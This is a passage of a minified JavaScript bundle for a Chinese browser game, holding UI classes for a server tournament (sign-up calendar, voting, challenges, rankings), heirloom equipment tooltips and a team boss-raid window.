i=o.GlobalConfig.LfRaceBase.groupName[e];t.push({name:i})}this.eTab.dataProvider=new eui.ArrayCollection(t)},e.prototype.update=function(){var t=s.HegemonyCT.ins().player16Info[0];if(t){t.playerData&&t.playerData.length>1&&t.playerData.sort(this.sort);for(var e in t.playerData)t.playerData[e].pos=+e+1;this.list.dataProvider=new eui.ArrayCollection(t.playerData)}},e.prototype.sort=function(t,e){return t.winTimes>e.winTimes?-1:t.winTimes<e.winTimes?1:t.winRound>e.winRound?-1:t.winRound<e.winRound?1:t.power<e.power?-1:t.power>e.power?1:0},e.prototype.onClick=function(t){},e}(n.BaseView);e.HSixteenRecordWin=r,window.HSixteenRecordWin=r,__reflect(r.prototype,"HSixteenRecordWin",[]),window.HSixteenRecordWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSixteenRecordItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&0!=this.data.length&&(this.data.pos>3?(this.rankImg.visible=!1,this.rank.visible=!0,this.rank.text=this.data.pos+""):(this.rankImg.visible=!0,this.rank.visible=!1,this.rankImg.source=this.data.pos?"paihang"+this.data.pos:""),this.eName.text=this.data.name,this.eServer.text=this.data.serverId+"",this.eResult.text=""+this.data.winTimes+gettext("胜")+this.data.loseTimes+gettext("负"),this.Result.text=""+this.data.winRound+gettext("胜")+this.data.loseRound+gettext("负"))},e}(n.BaseItemRender);e.HSixteenRecordItem=o,window.HSixteenRecordItem=o,__reflect(o.prototype,"HSixteenRecordItem",[]),window.HSixteenRecordItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HegemonyMainWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(76),r=i(44),l=i(46),h=i(109),u=i(1009),p=i(211),d=i(15),c=i(12),f=i(2),g=function(t){function e(){var e=t.call(this)||this;return e._sn_="HegemonyStriveWinSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];l.HegemonyCT.ins().isOpeningView=!0,this.oldIndex=this.tab.selectedIndex=this.viewStack.selectedIndex=t[0]?t[0]:0,this.setOpenIndex(this.oldIndex),this.observe(l.HegemonyCT.ins().postInit,this.update),this.observe(l.HegemonyCT.ins().postState,this.update),this.observe(l.HegemonyCT.ins().sendAgainst,this.update),this.observe(h.HegemonyRedPoint.ins().postRedPoint,this.refRedpoint),this.observe(r.ReadPlayerCT.ins().postGetPlayerResult,this.openOtherPlayerView),this.refRedpoint(),this.update()},e.prototype.openOtherPlayerView=function(t){l.HegemonyCT.ins().isOpenView||4==this.oldIndex||win.open("RRoleWin",t)},e.prototype.skinComplete=function(){this.tab.itemRenderer=p.TabBarItemRender,this.addChangeEvent(this.tab,this.onTabTouch),this.addChangingEvent(this.tab,this.onTabTouching),this.addTouchEvent(this,this.onTouch)},e.prototype.removeDisplay=function(){l.HegemonyCT.ins().isOpenView=!1,l.HegemonyCT.ins().isOpeningView=!1},e.prototype.update=function(){this.help.visible=!(l.HegemonyCT.ins().state==l.HegemonyStatus.Knockout&&l.HegemonyCT.ins().delegate==s.ActorCC.actorID)},e.prototype.onTabTouch=function(t){var e=this.tab.selectedIndex;this.setOpenIndex(e)},e.prototype.onTabTouching=function(t){return this.checkIsOpen(this.tab.selectedIndex)||(l.HegemonyCT.ins().isOpenView=!1,t.preventDefault()),3==t.currentTarget.selectedIndex?(l.HegemonyCT.ins().isOpenView=!0,win.open(u.HEventsMainWin),void t.preventDefault()):void 0},e.prototype.checkIsOpen=function(t){return!0},e.prototype.setOpenIndex=function(t){this.oldIndex!=t?this.oldIndex=t:this.tab.selectedIndex=this.viewStack.selectedIndex=t},e.prototype.onTouch=function(t){var e,i=l.HegemonyCT.ins().state;switch(t.target){case this.help:var n=void 0;n=i==l.HegemonyStatus.SignUp||i==l.HegemonyStatus.Knockout&&l.HegemonyCT.ins().delegate!=s.ActorCC.actorID?337:i==l.HegemonyStatus.Vote?338:i==l.HegemonyStatus.Challenge?339:l.HegemonyCT.ins().battleEnd&&!l.HegemonyCT.ins().nextOpenTime?340:5==this.tab.selectedIndex?345:341,win.open(a.CommonHelpWin,null===(e=o.GlobalConfig.HelpInfoConfig[n])||void 0===e?void 0:e.text)}},e.prototype.tabRp=function(){return h.HegemonyRedPoint.ins().redpoint>0},e.prototype.refRedpoint=function(){var t;null===(t=this.tab)||void 0===t?void 0:t.updateReds()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=c.OpenSystem.ins().checkSysOpen(d.SystemType.Hegemony);return i||f.TipsCT.ins().showTips(c.OpenSystem.ins().getNoOpenTips(d.SystemType.Hegemony)),i},e}(n.BaseView);e.HegemonyMainWin=g,window.HegemonyMainWin=g,__reflect(g.prototype,"HegemonyMainWin",[]),window.HegemonyMainWin=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HEventsMainWin=void 0;var n=i(1),o=i(44),s=i(46),a=i(109),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.currentRoleID=0,e.currenIndex=0,e._sn_="HSPreviousEvents",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.panelArr=[this.championPanel,this.battlePanel]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];s.HegemonyCT.ins().pFirstTap&&(s.HegemonyCT.ins().pFirstTap=!1,a.HegemonyRedPoint.ins().postRedPoint()),this.currentRoleID=0,this.currenIndex=0,this.addChangeEvent(this.tab,this.onTabTouch),this.addTouchEvent(this.closeBtn,this.onBtnTouch),this.observe(o.ReadPlayerCT.ins().postGetPlayerResult,this.openOtherPlayerView),this.setSelectedIndex(0),this.upDateView()},e.prototype.removeDisplay=function(){s.HegemonyCT.ins().isOpenView=!1},e.prototype.openOtherPlayerView=function(t){0!=this.currenIndex&&win.open("RRoleWin",t)},e.prototype.upDateView=function(){this.setRedPoint()},e.prototype.onBtnTouch=function(t){win.close(this)},e.prototype.onTabTouch=function(t){this.setSelectedIndex(this.tab.selectedIndex)},e.prototype.setSelectedIndex=function(t){this.currenIndex=t,this.setRedPoint()},e.prototype.setRedPoint=function(){return!1},e}(n.BaseView);e.HEventsMainWin=r,window.HEventsMainWin=r,__reflect(r.prototype,"HEventsMainWin",[]),window.HEventsMainWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HegemonyPanel=void 0;var n=i(16),o=i(1),s=i(4),a=i(46),r=i(1011),l=i(427),h=i(429),u=i(1012),p=i(1014),d=i(109),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="HegemonyStriveMainSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){this.observe(a.HegemonyCT.ins().postInit,this.upCurState),this.observe(a.HegemonyCT.ins().postState,this.upCurState),this.observe(a.HegemonyCT.ins().sendAgainst,this.upCurState),this.upCurState()},e.prototype.removeDisplay=function(){Timer.stopAll(this)},e.prototype.tabRp=function(){return d.HegemonyRedPoint.ins().redpoint1>0},e.prototype.upCurState=function(){this._curPanel&&n.DisplayUtils.removeFromParent(this._curPanel);var t=a.HegemonyCT.ins(),e=t.state;switch(e){case a.HegemonyStatus.None:case a.HegemonyStatus.SignUp:this.signupPanel||(this.signupPanel=new u.HSignupPanel),this._curPanel=this.signupPanel;break;case a.HegemonyStatus.Vote:this.votePanel||(this.votePanel=new p.HVotePanel),this._curPanel=this.votePanel;break;case a.HegemonyStatus.Challenge:this.challengePanel||(this.challengePanel=new r.HChallengePanel),this._curPanel=this.challengePanel;break;case a.HegemonyStatus.Knockout:a.HegemonyCT.ins().delegate==s.ActorCC.actorID?(this.knockoutPanel||(this.knockoutPanel=new l.HSKnockoutPanel),this._curPanel=this.knockoutPanel):(this.signupPanel||(this.signupPanel=new u.HSignupPanel),this._curPanel=this.signupPanel);break;case a.HegemonyStatus.Prom16:case a.HegemonyStatus.Prom8:case a.HegemonyStatus.Prom4:case a.HegemonyStatus.Finals:case a.HegemonyStatus.Over:t.battleEnd&&!t.nextOpenTime?(this.signupPanel||(this.signupPanel=new u.HSignupPanel),this._curPanel=this.signupPanel):(this.sixteenPanel||(this.sixteenPanel=new h.HSSixteenPanel),this._curPanel=this.sixteenPanel)}this._curPanel&&this.addChild(this._curPanel)},e}(o.BaseView);e.HegemonyPanel=c,window.HegemonyPanel=c,__reflect(c.prototype,"HegemonyPanel",[]),window.HegemonyPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HChallengePanel=void 0;var n=i(8),o=i(1),s=i(0),a=i(4),r=i(7),l=i(46),h=i(109),u=i(256),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="HSQualificationChallengeSkin",e.isInit=!0,e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){this.observe(l.HegemonyCT.ins().postChallenge,this.update),this.observe(l.HegemonyCT.ins().postWarReport,this.update),this.observe(h.HegemonyRedPoint.ins().postRedPoint,this.refRedPoint),l.HegemonyCT.ins().cFirstTap&&(l.HegemonyCT.ins().cFirstTap=!1,h.HegemonyRedPoint.ins().postRedPoint()),this.setTime(),this.update(),this.refRedPoint(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)},e.prototype.removeDisplay=function(){Timer.stop(this.setTime,this)},e.prototype.update=function(){var t=l.HegemonyCT.ins().challengeData;if(!t||!t[0])return this.noMan.visible=!0,this.roleGrp1.visible=this.roleGrp2.visible=this.btnGroup.visible=this.labGroup.visible=this.btnReport.visible=!1,void(this.icon1.source=this.icon2.source="");this.updateRoleItem(),this.noMan.visible=!1,this.roleGrp1.visible=this.roleGrp2.visible=this.btnGroup.visible=this.labGroup.visible=this.btnReport.visible=!0;var e=s.GlobalConfig.LfRaceBase;this.playName2.visible=this.poll2.visible=this.btnGroup.visible=this.btnReport.visible=!!t[0].challenger,this.choose.visible=t[0].state>1,this.choose.visible&&t[0].winner&&(this.choose.text=(t[0].winner?t[0].winner==t[0].beChoose?t[0].beChooseName:t[0].challengerName:"")+gettext("将代表本服出战")),this.server1.text="S."+t[0].beServer,this.roleImg1.source="job"+(t[0].beRole-1),this.playName1.text=t[0].beChooseName,this.poll1.text=gettext("得票数：")+t[0].bePoll,t[0].challenger?(this.server2.text="S."+t[0].server,this.roleImg2.source="job"+(t[0].role-1),this.playName2.text=t[0].challengerName,this.poll2.text=gettext("得票数：")+t[0].poll):(this.server2.text=gettext("无"),this.playName2.text=this.poll2.text="");var i=l.HegemonyCT.ins().warData[0];this.cBtn.visible=t[0].challenger==a.ActorCC.actorID&&!t[0].state,this.btnReport.visible=t[0].state>1&&!!i&&!i.winType&&i.fightData.length>0,this.desc.visible=!this.btnReport.visible,this.desc.text=t[0].challenger==a.ActorCC.actorID&&1==t[0].state?gettext("已发起挑战"):t[0].state>1?""+t[0].challengerName+gettext("未发起挑战"):1==t[0].state?""+t[0].challengerName+gettext("吹响进攻号角！"):gettext("等待{0}发起挑战",t[0].challengerName),this.icon1.source=this.icon2.source="",t[0].state>1&&(this.icon1.source=t[0].winner==t[0].beChoose?e.iconImg[0]:e.iconImg[1],this.icon2.source=t[0].winner==t[0].beChoose?e.iconImg[1]:e.iconImg[0]),this.score.text="",t[0].state>0&&i&&(i.score1||i.score2)&&(this.score.text=i.name1==t[0].beChooseName?i.score1+"."+i.score2:i.score2+"."+i.score1)},e.prototype.updateRoleItem=function(){if(l.HegemonyCT.ins().challengeData&&l.HegemonyCT.ins().challengeData[0]){var t=l.HegemonyCT.ins().challengeData[0],e={name:t.beChooseName,level:t.beLevel,job:t.beRole,outward:t.beOutward,titleID:t.beTitleId.toString(),wingID:t.beWingId,demonCirID:t.beDemonCir};this.roleItem1.data=e;var i={name:t.challengerName,level:t.level,job:t.role,outward:t.outward,titleID:t.titleId.toString(),wingID:t.wingId,demonCirID:t.demonCir};this.roleItem2.data=i}},e.prototype.setTime=function(){var t="",e=l.HegemonyCT.ins(),i=Math.floor((e.openTime-r.GameServerCC.serverTime)/1e3),o=Math.floor((e.tzBattleTime-r.GameServerCC.serverTime)/1e3),s=Math.floor((e.nextOpenTime-r.GameServerCC.serverTime)/1e3);e.challengeData[0]&&e.challengeData[0].state<2?i>0?t=gettext("资格挑战赛倒计时：")+n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3):(this.isInit&&(this.isInit=!1,this.update()),o>0&&(t=e.isBattle?gettext("挑战赛战斗进行中"):gettext("下一局比赛：")+n.DateUtils.getFormatBySecond(o,n.DateUtils.TIME_FORMAT_5,3))):e.challengeData[0]&&e.challengeData[0].state>1&&s>0&&(t=gettext("淘汰赛倒计时：")+n.DateUtils.getFormatBySecond(s,n.DateUtils.TIME_FORMAT_5,3)),this.times.text=t},e.prototype.refRedPoint=function(){this.cBtn.eRp&&(this.cBtn.eRp.visible=h.HegemonyRedPoint.ins().redpoint1>0)},e.prototype.onTouch=function(t){switch(t.target){case this.cBtn:l.HegemonyCT.ins().sendChallenge();break;case this.btnReport:l.HegemonyCT.ins().sendWarData(l.HegemonyCT.ins().NO,l.HegemonyCT.ins().group,0),win.open(u.HSWarReportWin)}},e}(o.BaseView);e.HChallengePanel=p,window.HChallengePanel=p,__reflect(p.prototype,"HChallengePanel",[]),window.HChallengePanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSignupPanel=void 0;var n=i(1),o=i(1013),s=i(109),a=i(46),r=i(0),l=i(2),h=i(8),u=i(7),p=i(77),d=function(t){function e(){var e=t.call(this)||this;return e._sn_="HSSignUpSkin",e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=p.ItemBaseNoName,this.grid.itemRenderer=o.HScalendarItem,this.addTouchEvent(this,this.onTouch),this.update(),this.setTime()},e.prototype.addDisplay=function(){this.observe(s.HegemonyRedPoint.ins().postRedPoint,this.refRedPoint),this.observe(a.HegemonyCT.ins().postInit,this.upCurState),this.observe(a.HegemonyCT.ins().postSignup,this.upCurState),this.refRedPoint(),this.upCurState(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)},e.prototype.removeDisplay=function(){Timer.stop(this.setTime,this)},e.prototype.onTouch=function(t){switch(t.target){case this.signUpBtn:a.HegemonyCT.ins().isOpen(!0)&&(a.HegemonyCT.ins().state==a.HegemonyStatus.SignUp||a.HegemonyCT.ins().isSignup?a.HegemonyCT.ins().sendSignup():l.TipsCT.ins().showTips("|C:15937822&T:"+gettext("当前不在报名时间内！")))}},e.prototype.update=function(){var t=h.DateUtils.getCurrentMonthFirst().getDay(),e=new Date(u.GameServerCC.serverTime).getFullYear(),i=new Date(u.GameServerCC.serverTime).getMonth(),n=new Date(e,i+1,0).getDate(),o=0,s=[];
if(t){o=i?new Date(e,i,0).getDate():new Date(e-1,12,0).getDate();for(var a=0;t>a;a++)s.push([o,0]),o--}s.reverse();for(var l=r.GlobalConfig.LfRaceBase,a=0;5>a;a++)l.stateName[a]&&this["desc"+(a+1)]&&(this["desc"+(a+1)].text=l.stateName[a]);var p=[];for(var d in r.GlobalConfig.LFRaceTime)if(Number(d)!=Object.keys(r.GlobalConfig.LFRaceTime).length){var c=r.GlobalConfig.LFRaceTime[d].startTimePoint/86400+1,f=Math.floor(r.GlobalConfig.LFRaceTime[d].optimeLimit/86400)+1;f||(f=c),p.push([c,f,d])}for(var g=[],m=1;n>=m;m++){for(var v=!1,y=0,C=p;y<C.length;y++){var T=C[y];if(T[0]<=m&&T[1]>=m){g.push([m,2,T[2]]),v=!0;break}}v||g.push([m,3])}for(var b=[],w=42-t-n,I=1;w>=I;I++)b.push([I,0]);var _=s.concat(g,b);this.grid.dataProvider=new eui.ArrayCollection(_),this.title.text=e+"-"+(i+1),this.rewardList.dataProvider=new eui.ArrayCollection(l.singleRewards)},e.prototype.upCurState=function(){var t=a.HegemonyCT.ins().state==a.HegemonyStatus.SignUp,e=a.HegemonyCT.ins().state==a.HegemonyStatus.Knockout;this.signed.visible=!!a.HegemonyCT.ins().isSignup&&t,this.signUpBtn.visible=!this.signed.visible&&t,this.vote.visible=t||e,this.vote.text=t?gettext("投票倒计时"):e?gettext("小组赛倒计时"):"",this.signed.visible&&(r.GlobalConfig.LfRaceBase.groupName[a.HegemonyCT.ins().group-1]?this.signed.text=""+r.GlobalConfig.LfRaceBase.groupName[a.HegemonyCT.ins().group-1]+gettext("已报名"):this.signed.text=gettext("报名失败"))},e.prototype.setTime=function(){var t="";if(a.HegemonyCT.ins().state==a.HegemonyStatus.SignUp)t=a.HegemonyCT.ins().getRemainTime();else if(a.HegemonyCT.ins().state==a.HegemonyStatus.Knockout){var e=Math.floor((a.HegemonyCT.ins().endTime-u.GameServerCC.serverTime)/1e3);e>0&&(t=h.DateUtils.getFormatBySecond(e,h.DateUtils.TIME_FORMAT_5,3))}this.times.text=t},e.prototype.refRedPoint=function(){this.signUpBtn.eRp&&(this.signUpBtn.eRp.visible=s.HegemonyRedPoint.ins().redpoint1>0)},e}(n.BaseView);e.HSignupPanel=d,window.HSignupPanel=d,__reflect(d.prototype,"HSignupPanel",[]),window.HSignupPanel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HScalendarItem=void 0;var n=i(3),o=i(0),s=i(7),a=i(46),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data&&this.data[0]){this.dayNumImg.source="hs_month_"+this.data[0],this.icon.source=this.eImg.source="",this.dayNumImg.alpha=1,0==this.data[1]&&(this.dayNumImg.alpha=.5);var t=o.GlobalConfig.LFRaceTime;if(this.data[2]&&t[this.data[2]]){t[this.data[2]].icon&&(this.icon.source=t[this.data[2]].icon);var e=t[this.data[2]].status;1==this.data[1]||1==e?this.eImg.source="colorBox_gre":2==e?this.eImg.source="colorBox_blu":3==e?this.eImg.source="colorBox_pur":4==e?this.eImg.source="colorBox_red":e>=5&&8>=e&&(this.eImg.source="colorBox_yel")}var i=new Date(s.GameServerCC.serverTime).getDate();this.choose.visible=this.data[0]==i&&!!this.data[1]&&(a.HegemonyCT.ins().state==a.HegemonyStatus.SignUp||a.HegemonyCT.ins().state==a.HegemonyStatus.Knockout)}},e}(n.BaseItemRender);e.HScalendarItem=r,window.HScalendarItem=r,__reflect(r.prototype,"HScalendarItem",[]),window.HScalendarItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HVotePanel=void 0;var n=i(8),o=i(1),s=i(7),a=i(2),r=i(27),l=i(46),h=i(1015),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="HSVoteSkin",e.isInit=!0,e.voteDatas=[],e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=h.HVoteItem,this.addTouchEvent(this,this.onTouch),l.HegemonyCT.ins().sendPoll(),this.setTime()},e.prototype.addDisplay=function(){this.observe(l.HegemonyCT.ins().postInit,this.update),this.observe(l.HegemonyCT.ins().postPoll,this.update),this.observe(l.HegemonyCT.ins().postVote,this.update),this.addTouchEvent(this.voteBtn1,this.onVoteTouch),this.addTouchEvent(this.voteBtn2,this.onVoteTouch),this.update(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)},e.prototype.removeDisplay=function(){Timer.stop(this.setTime,this)},e.prototype.update=function(){var t=l.HegemonyCT.ins().voteData;this.noMan.visible=!t||t.length<1,this.list.visible=!this.noMan.visible,t&&t.length>1&&t.sort(this.sort),this.voteDatas=[];var e=[];for(var i in t){var n=+i+1;t[i].index=n,3>n?this.voteDatas[n]=t[i]:e.push(t[i])}for(var i=1;2>=i;i++)this.voteDatas[i]?(this["roleImg"+i].source="job"+(this.voteDatas[i].job-1),this["lb_name"+i].text=this.voteDatas[i].name,this["lb_guild"+i].text=this.voteDatas[i].guildName,this["lb_voteNum"+i].text=this.voteDatas[i].poll.toString()):(this["lb_name"+i].text=gettext("未报名"),this["lb_guild"+i].text=gettext(""),this["lb_voteNum"+i].text=gettext(""));this.list.dataProvider=new eui.ArrayCollection(e),this.voteBtn1.eRp&&(this.voteBtn1.eRp.visible=this.voteBtn1.visible&&!l.HegemonyCT.ins().isVote),this.voteBtn2.eRp&&(this.voteBtn2.eRp.visible=this.voteBtn2.visible&&!l.HegemonyCT.ins().isVote)},e.prototype.sort=function(t,e){return t.poll>e.poll?-1:t.poll<e.poll?1:t.power>e.power?-1:t.power<e.power?1:t.id<e.id?-1:t.id>e.id?1:0},e.prototype.setTime=function(){var t=Math.floor((l.HegemonyCT.ins().voteEndTime-s.GameServerCC.serverTime)/1e3),e=Math.floor((l.HegemonyCT.ins().nextOpenTime-s.GameServerCC.serverTime)/1e3);this.times.text=this.endtime.text="",this.voteEnd.visible=!0,t>0?this.times.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_5,3):(this.voteEnd.visible=!1,e>0&&(this.endtime.text=gettext("投票已截止，资格挑战赛倒计时：")+n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)),this.isInit&&(this.isInit=!1,l.HegemonyCT.ins().sendPoll(),this.update()))},e.prototype.onTouch=function(t){if(t.target.parent instanceof h.HVoteItem){var e=t.target.parent.data;this.sendVote(e.name,e.id)}},e.prototype.onVoteTouch=function(t){var e=0;switch(t.currentTarget){case this.voteBtn1:e=1;break;case this.voteBtn2:e=2}this.voteDatas[e]&&this.sendVote(this.voteDatas[e].name,this.voteDatas[e].id)},e.prototype.sendVote=function(t,e){if(l.HegemonyCT.ins().isVote)return void a.TipsCT.ins().showTips(gettext("今日投票机会已用完"));var i=gettext("每人每日只可投一票，是否将这一票投给{0}？",t);r.WarnWin.show(i,function(){l.HegemonyCT.ins().sendVote(e)},this)},e}(o.BaseView);e.HVotePanel=u,window.HVotePanel=u,__reflect(u.prototype,"HVotePanel",[]),window.HVotePanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HVoteItem=void 0;var n=i(3),o=i(0),s=i(7),a=i(46),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;if(t){this.imgJob.source="yuanhead"+t.job+"1",this.guildName.text=t.guildName,this.power.text=t.power+"",this.player.text=t.name+"",this.pos.text=t.index+"",this.poll.text=t.poll+"";var e=o.GlobalConfig.LfRaceBase.btnState;this.eBtn.icon=a.HegemonyCT.ins().isVote>0?e[0]:e[1],this.eBtn.visible=Math.floor((a.HegemonyCT.ins().voteEndTime-s.GameServerCC.serverTime)/1e3)>0,this.eBtn.eRp&&(this.eBtn.eRp.visible=this.eBtn.visible&&!a.HegemonyCT.ins().isVote)}}},e}(n.BaseItemRender);e.HVoteItem=r,window.HVoteItem=r,__reflect(r.prototype,"HVoteItem",[]),window.HVoteItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomEquipTipsWin=void 0;var n=i(1),o=i(0),s=i(351),a=i(22),r=i(5),l=i(10),h=i(34),u=i(16),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="heirloomitemtips",e.showArr=["",gettext("头盔"),"",gettext("项链"),gettext("护手"),gettext("护手"),gettext("戒指"),gettext("戒指"),gettext("腰带"),gettext("鞋子")],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.curRole=t[0],this.index=t[1];var i=t[2];this.curRole&&this.curRole.heirloom&&(this.info=this.curRole.heirloom.getInfoBySolt(this.index)),this.info&&this.info.lv&&!i||(this.info=o.GlobalConfig.HeirloomEquipConfig[this.index+1][i||this.info.lv]),this.addTouchEndEvent(this.bgClose,this.onClick),this.init()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.init=function(){var t;this.equipItem.data={pos:this.index,info:this.info},this.equipItem.setTipsVisible(),this.equipName.text=this.info.name,this.info.skillicon||u.DisplayUtils.removeFromParent(this.skillGrp),this.slot.text=s.HeirloomData.getEquipName(this.index);var e=this.setBasicsDesc();this.value0.textFlow=(new egret.HtmlTextParser).parse(a.AttributeData.getAttrShowStr(this.setBasicsDesc(),":")),this.setSkillDesc();var i=Math.floor(l.ItemUtil.getAttrPower(e));this.powerLab.text=gettext("战力{0}",i);for(var n,r="",h=0,p=0,d=0,c=0;c<this.showArr.length;c++)""!=this.showArr[c]&&(4==h&&(r+="\n"),h++,d=0,this.curRole&&(d=(null===(t=this.curRole.heirloom.getInfoBySolt(c))||void 0===t?void 0:t.lv)||0),this.curRole&&this.info&&d>=this.info.lv?(p++,n=2149168):n=7697263,r+="<a color="+n+">"+this.showArr[c]+"</a>      ");this.itemLab.textFlow=(new egret.HtmlTextParser).parse(r);var f=o.GlobalConfig.HeirloomEquipSetConfig[this.info.lv];this.name1.text=f.name,n=0==p?7697263:2149168;var g=p>=h?"<a color=0x20cb30>("+p+"/"+h+")</a>":"(<a color="+n+">"+p+"</a>/"+h+")";this.hasLab.textFlow=(new egret.HtmlTextParser).parse(g),n=8>p?7697263:2149168,this.value2.textFlow=(new egret.HtmlTextParser).parse(a.AttributeData.getAttrShowStr(f.attr,":",[],!1,0,n))},e.prototype.onClick=function(){win.close(this)},e.prototype.setBasicsDesc=function(){for(var t=[],e=0;e<this.info.attr.length;e++){var i=this.info.attr[e];i.type<=h.AttributeType.atCurseCd&&i.type>=h.AttributeType.atVamirePro||t.push({type:i.type,value:i.value})}return t},e.prototype.setSkillDesc=function(){var t="";t=this.info.skillname?this.info.skillname+"\n"+this.info.skilldesc:"无",this.skilldesc.textFlow=r.TextFlowMaker.generateTextFlow1(t)},e}(n.BaseView);e.HeirloomEquipTipsWin=p,window.HeirloomEquipTipsWin=p,__reflect(p.prototype,"HeirloomEquipTipsWin",[]),window.HeirloomEquipTipsWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomSkillItem=void 0;var n=i(1),o=i(5),s=i(49),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="heirloomTipsSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1],o=t[2],s=t[3];this.addTouchEndEvent(this,this.onClick),this.setData(i,n,o,s)},e.prototype.onClick=function(t){win.close(this)},e.prototype.setData=function(t,e,i,n){this.imgIcon.source=t,this.imgIcon.filters=n?null:s.FilterUtil.ARRAY_GRAY_FILTER,this.nameTxt.textFlow=o.TextFlowMaker.generateTextFlow1(e),this.nameLabel.textFlow=o.TextFlowMaker.generateTextFlow1(e),this.description.textFlow=o.TextFlowMaker.generateTextFlow1(i)},e}(n.BaseView);e.HeirloomSkillItem=a,window.HeirloomSkillItem=a,__reflect(a.prototype,"HeirloomSkillItem",[]),window.HeirloomSkillItem=a},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeBossWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(4),r=i(2),l=i(27),h=i(82),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="InvadebossSkin",e._memberArr=[],e._curPower=0,e.bolMyTeam=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this._memberArr=[this.leader,this.member1,this.member2],this.addTouchEvent(this.closeBtn,this.onClick),this.addTouchEvent(this.start,this.onClick),this.observe(h.InvadeCT.ins().postInvadeInfoUpdate,this.updateInfo),this.observe(h.InvadeCT.ins().postInvadeTeamUpdate,this.updateInfo),this.rewardList.itemRenderer=o.ItemBase,this._winDropShowArr=new eui.ArrayCollection,this.rewardList.dataProvider=this._winDropShowArr,this.rewardList0.itemRenderer=o.ItemBase,this._loseDropShowArr=new eui.ArrayCollection,this.rewardList0.dataProvider=this._loseDropShowArr},e.prototype.onClick=function(t){var e=this;switch(t.target){case this.closeBtn:win.close(this);break;case this.start:h.InvadeCT.ins().bolOpen?2==h.InvadeCT.ins().fightPhase?r.TipsCT.ins().showTips(gettext("本轮战斗未结束")):this.bolMyTeam?h.InvadeCT.ins().checkMeIsLeader()?(h.InvadeCT.ins().sendQuitTeam(),win.close(this)):h.InvadeCT.ins().invadeTeamBaseId?r.TipsCT.ins().showTips(gettext("已经报名无法退出队伍")):r.TipsCT.ins().showTips(gettext("只有队长才能解散队伍")):h.InvadeCT.ins().invadeTeamDatas.length?h.InvadeCT.ins().checkMeIsLeader()?h.InvadeCT.ins().sendJoin(this._info.id):r.TipsCT.ins().showTips(gettext("只有队长才能报名")):l.WarnWin.show(gettext("当前没有组队，确定要单人参战吗?"),function(){h.InvadeCT.ins().sendCreateTeam(),Timer.start(200,1,function(){h.InvadeCT.ins().sendJoin(e._info.id)},e)},this):r.TipsCT.ins().showTips(gettext("本轮尚未到达报名时间"))}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._info=t[0];var 